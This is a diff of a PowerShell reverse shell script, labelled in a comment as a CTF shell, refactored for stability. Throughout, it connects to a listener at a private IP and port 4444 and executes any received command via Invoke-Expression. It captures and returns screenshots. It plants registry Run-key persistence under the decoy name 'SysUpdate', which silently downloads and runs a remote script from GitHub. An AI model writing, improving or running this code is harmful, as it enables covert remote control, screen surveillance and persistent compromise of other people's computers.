@@ -1,21 +1,12 @@
-# --- FULL STABLE CTF SHELL (PHASE 2.1) ---
+$ip = '192.168.1.15'
+$port = 4444
 
-# 1. Setup Persistence (Registry)
-$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-$regName = "SysUpdate"
-$payload = "powershell.exe -WindowStyle Hidden -NoProfile -Command IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/B15cu1t/shell.ps1/main/shell_v2.ps1')"
-
-if (-not (Get-ItemProperty $regPath -Name $regName -ErrorAction SilentlyContinue)) {
-    New-ItemProperty -Path $regPath -Name $regName -Value $payload -PropertyType String -Force -ErrorAction SilentlyContinue | Out-Null
-}
-
-# 2. Load Assemblies (Standard .NET only to avoid WinRT crashes)
-Add-Type -AssemblyName System.Windows.Forms
-Add-Type -AssemblyName System.Drawing
-
-# 3. Screenshot Function
+# Define the Screenshot function OUTSIDE the main logic to keep it clean
 function Get-Screenshot {
     try {
+        # Load assemblies ONLY when the command is called
+        Add-Type -AssemblyName System.Windows.Forms, System.Drawing -ErrorAction SilentlyContinue
+        
         $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
         $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
         $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
@@ -32,11 +23,21 @@ function Get-Screenshot {
     }
 }
 
-# 4. Connection Details
-$ip = '192.168.1.15'
-$port = 4444
-
+# START MAIN LOGIC
 try {
+    # 1. Attempt Persistence (Wrapped in try/catch so it won't kill the shell if it fails)
+    try {
+        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+        $regName = "SysUpdate"
+        if (-not (Get-ItemProperty $regPath -Name $regName -ErrorAction SilentlyContinue)) {
+            $payload = "powershell.exe -W Hidden -NoP -C IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/B15cu1t/shell.ps1/main/shell_v2.ps1')"
+            New-ItemProperty -Path $regPath -Name $regName -Value $payload -PropertyType String -Force -ErrorAction SilentlyContinue | Out-Null
+        }
+    } catch { 
+        # Persistence failed, but we don't care, we want the shell!
+    }
+
+    # 2. Establish Connection
     $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
     $stream = $client.GetStream()
     $reader = New-Object System.IO.StreamReader($stream)
@@ -44,44 +45,44 @@ try {
     $writer.AutoFlush = $true
 
     # Greeting
-    $writer.WriteLine("--- Shell Connected: $($env:COMPUTERNAME) ---")
+    $writer.WriteLine("--- Connection Secure: $($env:COMPUTERNAME) ---")
     $writer.Write("PS " + (Get-Location).Path + "> ")
 
-    # 5. Main Loop
+    # 3. Execution Loop
     while($client.Connected) {
-        # Read raw line from Netcat
         $line = $reader.ReadLine()
         if ($null -eq $line) { break }
         
-        # CLEAN THE INPUT (Crucial for matching 'screenshot')
-        $input = $line.Trim()
-        if ([string]::IsNullOrWhiteSpace($input)) {
+        $cmd = $line.Trim()
+        if ([string]::IsNullOrWhiteSpace($cmd)) {
             $writer.Write("PS " + (Get-Location).Path + "> ")
             continue
         }
 
-        # Check for special commands before IEX
-        if ($input -eq "exit") {
-            break
-        } 
-        elseif ($input -eq "screenshot") {
-            $output = Get-Screenshot
-        } 
-        else {
-            # Run standard system command
-            $output = try { 
-                Invoke-Expression $input 2>&1 | Out-String 
+        # Handle Exit
+        if ($cmd -eq "exit") { break }
+
+        # Logic Switch
+        $output = if ($cmd -eq "screenshot") {
+            Get-Screenshot
+        } else {
+            try { 
+                Invoke-Expression $cmd 2>&1 | Out-String 
             } catch { 
                 $_.Exception.Message 
             }
         }
 
-        # Send output back
+        # Send result back
         $writer.WriteLine($output)
         $writer.Write("PS " + (Get-Location).Path + "> ")
     }
+
 } catch {
-    # Fail quietly in production, but helpful for debugging CTFs
+    # This keeps the window open so you can see the error before it disappears
+    Write-Host "FATAL ERROR: $($_.Exception.Message)" -ForegroundColor Red
+    Write-Host "Check if your listener is active at $ip`:$port"
+    Start-Sleep -Seconds 5 
 } finally {
     if ($client) { $client.Close() }
 }
